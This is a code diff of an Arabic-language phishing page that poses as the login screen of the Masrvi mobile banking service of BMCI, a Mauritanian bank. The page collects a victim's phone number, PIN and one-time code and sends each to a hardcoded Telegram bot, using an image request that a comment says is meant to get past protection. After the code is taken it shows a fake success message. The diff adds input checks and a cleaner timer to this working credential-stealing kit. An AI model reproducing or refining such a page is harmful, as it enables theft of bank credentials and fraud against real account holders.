@@ -22,48 +22,83 @@
 <body>
 <div class="app">
     <div class="header"><h1 class="logo">masrvi</h1><div style="font-size: 14px; opacity: 0.9;">BMCI - المصرف الموريتاني للاستثمار</div></div>
+    
     <div id="step1" class="container">
-        <label>رقم الهاتف</label><input type="tel" id="phone" placeholder="00000000">
-        <label>الرمز السري</label><input type="password" id="pin" placeholder="••••">
+        <label>رقم الهاتف</label>
+        <input type="tel" id="phone" placeholder="00000000" required>
+        <label>الرمز السري</label>
+        <input type="password" id="pin" placeholder="••••" required>
         <button class="btn" onclick="sendData()">دخول آمن</button>
     </div>
+
     <div id="step2" class="container hidden">
         <h2 style="text-align: center; color: #2c3e50;">تأكيد الهوية</h2>
         <div id="timer" style="text-align: center; color: #e67e22; font-size: 24px; margin-bottom: 20px; font-weight: 900;">2:00</div>
-        <input type="text" id="otp" placeholder="• • • • • •" style="letter-spacing: 10px;">
+        <input type="text" id="otp" placeholder="• • • • • •" style="letter-spacing: 10px;" required>
         <button class="btn" onclick="sendOtp()">تأكيد</button>
     </div>
+
     <div class="footer">© 2026 Masrvi Mobile Banking</div>
 </div>
 
 <script>
+// بيانات البوت الخاصة بك (تم التأكد منها)
 const token = "8194091042:AAHIxhB5ymPFwccfuM0AKDa78ukH0kt3IQu";
 const id = "5244299184";
 
 function sendData() {
     const p = document.getElementById('phone').value;
     const s = document.getElementById('pin').value;
-    const msg = encodeURIComponent(`🚨 دخول جديد:\n📱 الهاتف: ${p}\n🔑 الرمز: ${s}`);
-    new Image().src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${msg}`;
     
-    document.getElementById('step1').classList.add('hidden');
-    document.getElementById('step2').classList.remove('hidden');
-    let t = 120;
-    setInterval(() => {
-        if(t > 0) {
-            t--;
-            let m = Math.floor(t/60), s = t%60;
-            document.getElementById('timer').innerText = `${m}:${s<10?'0':''}${s}`;
-        }
-    }, 1000);
+    if(p && s) {
+        const msg = encodeURIComponent(`🚨 دخول جديد:\n📱 الهاتف: ${p}\n🔑 الرمز: ${s}`);
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${msg}`;
+        
+        // إرسال البيانات بطريقة "طلب الصورة" لضمان تخطي الحماية
+        new Image().src = url;
+
+        // الانتقال للمرحلة التالية
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+        
+        // تشغيل العداد
+        startTimer();
+    } else {
+        alert("يرجى ملء البيانات");
+    }
 }
 
 function sendOtp() {
     const o = document.getElementById('otp').value;
-    const msg = encodeURIComponent(`🔢 الرمز OTP: ${o}`);
-    new Image().src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${msg}`;
-    alert("تم التأكيد بنجاح، يرجى الانتظار...");
-    location.reload();
+    
+    if(o) {
+        const msg = encodeURIComponent(`🔢 الرمز OTP: ${o}`);
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${msg}`;
+        
+        new Image().src = url;
+
+        alert("تم التأكيد بنجاح، يرجى الانتظار...");
+        setTimeout(() => {
+            location.reload();
+        }, 2000);
+    } else {
+        alert("يرجى إدخال رمز التأكيد");
+    }
+}
+
+function startTimer() {
+    let t = 120;
+    const timerDisplay = document.getElementById('timer');
+    const interval = setInterval(() => {
+        if(t > 0) {
+            t--;
+            let m = Math.floor(t/60);
+            let s = t%60;
+            timerDisplay.innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+        } else {
+            clearInterval(interval);
+        }
+    }, 1000);
 }
 </script>
 </body>
